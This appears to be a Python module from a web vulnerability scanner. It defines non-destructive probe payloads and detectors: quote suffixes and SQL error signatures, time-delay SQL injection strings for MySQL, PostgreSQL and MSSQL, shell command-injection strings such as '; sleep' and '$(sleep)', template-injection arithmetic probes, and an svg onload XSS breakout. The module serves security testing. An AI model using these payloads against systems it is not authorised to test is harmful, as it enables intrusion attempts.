"""Injection payloads and their (pure) detectors.

Everything here is non-destructive: quotes to trigger SQL errors, time delays to
prove blind execution, an arithmetic expression to prove template evaluation, and
a reflection canary to prove XSS. No payload reads, writes, or deletes data.
"""

from __future__ import annotations

import re
import secrets
from dataclasses import dataclass

# --- SQL error signatures (DBMS-agnostic) ----------------------------------
_SQL_ERROR_RE = re.compile(
    r"("
    r"SQL syntax.*?MySQL|MySQLSyntaxErrorException|valid MySQL result|mysql_fetch|"
    r"PostgreSQL.*?ERROR|pg_query\(\)|PSQLException|"
    r"ORA-\d{5}|Oracle.*?Driver|"
    r"Microsoft SQL Server|ODBC SQL Server Driver|Unclosed quotation mark|"
    r"SQLite/JDBCDriver|SQLite\.Exception|sqlite3\.OperationalError|"
    r"SQLSTATE|Syntax error.*?SQL|quoted string not properly terminated"
    r")",
    re.I,
)


@dataclass(frozen=True)
class TimePayload:
    name: str
    payload: str    # appended to the base value; delays if injectable
    control: str    # same shape, zero delay — used to rule out slow endpoints


def sqli_error_payloads() -> list[str]:
    """Suffixes that break SQL string/numeric context to surface an error."""
    return ["'", "\"", "')", "';", "\"))"]


def sqli_time_payloads(seconds: int) -> list[TimePayload]:
    n = int(seconds)
    return [
        TimePayload("MySQL/string", f"' AND SLEEP({n})-- -", "' AND SLEEP(0)-- -"),
        TimePayload("MySQL/numeric", f" AND SLEEP({n})", " AND SLEEP(0)"),
        TimePayload("MySQL/or", f"' OR SLEEP({n})-- -", "' OR SLEEP(0)-- -"),
        TimePayload("PostgreSQL", f"' AND {n}=(SELECT {n} FROM PG_SLEEP({n}))-- -",
                    "' AND 1=1-- -"),
        TimePayload("MSSQL", f"'; WAITFOR DELAY '0:0:{n}'-- -", "'; WAITFOR DELAY '0:0:0'-- -"),
    ]


def cmd_time_payloads(seconds: int) -> list[TimePayload]:
    n = int(seconds)
    return [
        TimePayload("unix/semicolon", f"; sleep {n}", "; sleep 0"),
        TimePayload("unix/pipe", f"| sleep {n}", "| sleep 0"),
        TimePayload("unix/and", f"&& sleep {n}", "&& sleep 0"),
        TimePayload("unix/subshell", f"$(sleep {n})", "$(sleep 0)"),
        TimePayload("unix/backtick", f"`sleep {n}`", "`sleep 0`"),
        TimePayload("unix/ping", f"; ping -c {n} 127.0.0.1", "; ping -c 1 127.0.0.1"),
        TimePayload("windows/timeout", f"& timeout /t {n}", "& timeout /t 0"),
    ]


# --- SSTI ------------------------------------------------------------------
# Distinctive factors so the product can't appear by coincidence, and so we can
# confirm the *expression* (not the product) is absent from the response.
_SSTI_A, _SSTI_B = 269, 271
SSTI_PRODUCT = str(_SSTI_A * _SSTI_B)   # "72899"
SSTI_EXPR = f"{_SSTI_A}*{_SSTI_B}"


@dataclass(frozen=True)
class SstiPayload:
    engine: str
    payload: str


def ssti_payloads() -> list[SstiPayload]:
    a, b = _SSTI_A, _SSTI_B
    return [
        SstiPayload("Jinja2/Twig/Nunjucks", f"{{{{{a}*{b}}}}}"),
        SstiPayload("EL/FreeMarker/JS-template", f"${{{a}*{b}}}"),
        SstiPayload("Ruby/Thymeleaf", f"#{{{a}*{b}}}"),
        SstiPayload("ERB", f"<%= {a}*{b} %>"),
    ]


# --- XSS -------------------------------------------------------------------
# Fixed breakout tail so the detector can look for OUR exact characters right
# after the canary (not just any special in a window, which surrounding markup
# would trip).
_XSS_TAIL = '"><svg/onload=alert(document.domain)>'


@dataclass(frozen=True)
class XssPayload:
    canary: str
    payload: str


def xss_payload() -> XssPayload:
    canary = "pk" + secrets.token_hex(5)
    # Proves an HTML-breaking, script-executing injection reflects unescaped.
    return XssPayload(canary=canary, payload=canary + _XSS_TAIL)


# --- detectors -------------------------------------------------------------

def find_sql_error(text: str) -> str | None:
    m = _SQL_ERROR_RE.search(text or "")
    return m.group(0)[:80] if m else None


def is_delayed(baseline: float, payload: float, control: float, seconds: int,
               factor: float = 0.5) -> bool:
    """True only if the payload clearly delayed vs BOTH baseline and control."""
    threshold = seconds * factor
    return (
        payload >= threshold
        and (payload - baseline) >= threshold
        and (payload - control) >= threshold
    )


def ssti_evaluated(text: str) -> bool:
    """The product appears and the raw expression does not -> it was evaluated."""
    body = text or ""
    return SSTI_PRODUCT in body and SSTI_EXPR not in body


def xss_reflected(text: str, canary: str) -> str | None:
    """Return a confidence ('high'/'medium') if OUR breakout survives unescaped.

    We check the characters immediately after the canary against our own payload
    tail, so legitimate surrounding markup can't create a false positive.
    """
    body = text or ""
    idx = body.find(canary)
    if idx == -1:
        return None
    after = body[idx + len(canary):]
    if after.startswith('"><svg'):
        return "high"      # full HTML breakout survived -> markup is live
    if after.startswith('"'):
        return "medium"    # attribute-quote breakout survived
    return None


__all__ = [
    "TimePayload", "SstiPayload", "XssPayload",
    "sqli_error_payloads", "sqli_time_payloads", "cmd_time_payloads",
    "ssti_payloads", "xss_payload",
    "find_sql_error", "is_delayed", "ssti_evaluated", "xss_reflected",
    "SSTI_PRODUCT", "SSTI_EXPR",
]
